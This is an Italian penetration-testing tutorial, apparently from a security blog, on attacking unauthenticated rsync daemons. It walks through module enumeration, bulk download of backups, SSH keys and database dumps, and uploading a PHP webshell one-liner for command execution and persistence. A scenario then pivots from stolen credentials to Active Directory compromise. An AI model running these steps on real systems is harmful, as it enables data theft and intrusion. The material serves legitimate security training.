---
title: 'Rsync: trasferimento file e attacchi mirati da terminale'
description: >-
  Rsync è un potente strumento per sincronizzare e trasferire file da terminale.
  Scopri come viene usato anche in attacchi interni per esfiltrazione dati.
image: /rsync.webp
draft: true
date: 2026-01-25T00:00:00.000Z
categories:
  - networking
subcategories:
  - protocolli
tags:
  - rsync
  - ''
featured: true
---

# Rsync: il canale silenzioso per l’esfiltrazione dei dati

Report Red Team | Ambiente controllato autorizzato

Rsync è uno strumento di sincronizzazione file progettato per trasferire solo le differenze tra directory locali e remote. In ambito offensivo, un servizio rsync esposto rappresenta spesso un punto di accesso sottovalutato ma estremamente critico, soprattutto quando utilizzato per backup automatici o sincronizzazioni interne.

Un daemon rsync accessibile sulla porta 873 può esporre directory complete senza autenticazione, consentendo a un attaccante di enumerare, copiare e in alcuni casi modificare file sensibili in modo silenzioso e veloce.

## Introduzione: perché rsync è pericoloso

Rsync consente di:

* elencare moduli condivisi simili a share SMB
* esplorare directory remote senza scaricare file
* copiare interi backup preservando permessi e timestamp
* scrivere file se il modulo è configurato in read-write

In ambienti aziendali rsync viene spesso usato per backup di:

* configurazioni di sistema
* database
* codice applicativo
* chiavi SSH
* file di log

Se mal configurato, diventa una vetrina diretta sui dati più sensibili dell’infrastruttura.

## Setup e primi passi

Rsync è solitamente già installato su Kali Linux.

```
rsync --version
```

Individuazione del servizio sul target:

```
sudo nmap -sV -p 873 10.10.20.5 -n -Pn
```

Non è richiesta alcuna configurazione lato client. L’obiettivo è individuare moduli accessibili senza autenticazione o protetti da credenziali deboli.

## Tecniche offensive

## Tecnica 1: enumerazione dei moduli

Situazione: la porta 873 è aperta su 10.10.20.5.

```
rsync 10.10.20.5::
```

Output tipico:

```
backup
www
conf
```

Questo comando elenca tutti i moduli pubblici del daemon rsync. Moduli come backup, conf, db, logs indicano immediatamente esposizione di dati ad alto valore.

Anche un errore di accesso conferma la presenza del servizio e fornisce informazioni utili sul suo stato.

## Tecnica 2: esplorazione non invasiva con list-only

Situazione: è stato individuato il modulo backup.

```
rsync -av --list-only rsync://10.10.20.5/backup/
```

Output tipico:

```
drwxr-xr-x        .
-rw-r--r--        web_app.tar.gz
-rw-------        database_backup.sql
-r--------        id_rsa_backup
```

Il flag list-only consente di:

* valutare struttura e contenuti
* individuare file sensibili
* pianificare un loot mirato

File come backup SQL o chiavi SSH indicano immediatamente un potenziale accesso diretto ad altri sistemi.

## Tecnica 3: esfiltrazione mirata dei file

Creazione directory locale:

```
mkdir -p loot/rsync_backup
```

Download completo del modulo:

```
rsync -av --progress rsync://10.10.20.5/backup/ ./loot/rsync_backup/
```

Download di un singolo file:

```
rsync -av --progress rsync://10.10.20.5/backup/id_rsa_backup ./
```

L’opzione archive preserva permessi e timestamp, utile per analisi successive. Database dump e chiavi SSH possono portare rapidamente a credenziali riutilizzabili o accesso diretto via SSH.

## Tecnica 4: scrittura malevola e persistenza

Situazione: il modulo www è scrivibile.

Creazione di una webshell locale:

```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Upload nel modulo remoto:

```
rsync -av ./shell.php rsync://10.10.20.5/www/upload/shell.php
```

Verifica del contenuto:

```
rsync -av --list-only rsync://10.10.20.5/www/upload/
```

Se il modulo punta alla root web, l’upload consente immediata esecuzione di comandi. In alternativa è possibile sovrascrivere script di cron o file eseguiti automaticamente.

Questa capacità trasforma rsync da canale di lettura a vettore di compromissione attiva.

## Scenario di attacco completo

Contesto: durante un test autorizzato viene individuato rsync su backup-srv.internal (10.10.30.10).

Step 1: scoperta del servizio

```
sudo nmap -sV -p 873 10.10.30.10
rsync 10.10.30.10::
```

Modulo individuato: conf\_backups.

Step 2: esplorazione e loot

```
rsync -av --list-only rsync://10.10.30.10/conf_backups/
rsync -av rsync://10.10.30.10/conf_backups/network_device_configs/ ./loot/
```

Step 3: analisi

I file di configurazione contengono credenziali TACACS+ e SNMP utilizzate anche su sistemi Windows.

Step 4: pivot

Le credenziali vengono riutilizzate per ottenere accesso WinRM a un server. Da lì parte l’enumerazione Active Directory fino alla compromissione di account privilegiati.

Risultato finale: un servizio rsync interno non autenticato diventa il punto di ingresso per il dominio.

## Considerazioni finali

I servizi di backup sono spesso i più trascurati e i più pericolosi.
Rsync deve essere sempre valutato come vettore di esfiltrazione e accesso.

Rsync non sostituisce nmap o strumenti AD, ma quando presente è uno strumento ad altissimo impatto.

I file scaricati devono essere analizzati sistematicamente per:

* credenziali
* chiavi
* configurazioni riutilizzabili

## HackITA

[Supporta](https://hackita.it/supporto/) HackITA per mantenere contenuti tecnici indipendenti.
[Formazione](https://hackita.it/servizi/) 1:1 su Red Team e Active Directory.
Servizi di sicurezza offensiva per aziende in ambienti autorizzati.

Rsync non fa rumore.
Ma apre tutto.
